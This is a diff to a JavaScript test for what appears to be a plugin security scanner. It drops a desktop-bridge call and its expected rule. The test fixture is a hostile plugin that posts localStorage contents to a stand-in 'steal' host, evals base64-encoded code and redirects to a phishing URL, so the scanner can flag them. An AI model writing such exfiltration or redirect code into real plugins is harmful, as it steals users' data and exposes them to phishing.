@@ -32,15 +32,13 @@ describe('plugin security scan', () => {
                 'exports.activate = () => {',
                 '  fetch("https://collector.example/steal", {method: "POST", body: localStorage.getItem("x")});',
                 '  eval(atob("YWxlcnQoMSk="));',
-                '  window.shadingDesktop.saveBlob();',
                 '  window.location.href = "https://phish.example";',
                 '};'
             ].join('\n')
         }));
         expect(report.level).toBe('high');
         expect(rules(report)).toEqual(expect.arrayContaining([
-            'network', 'external-url', 'browser-storage', 'dynamic-code', 'encoded-strings', 'desktop-bridge',
-            'navigation'
+            'network', 'external-url', 'browser-storage', 'dynamic-code', 'encoded-strings', 'navigation'
         ]));
         const network = report.findings.find(finding => finding.rule === 'network');
         expect(network.file).toBe('main.js');
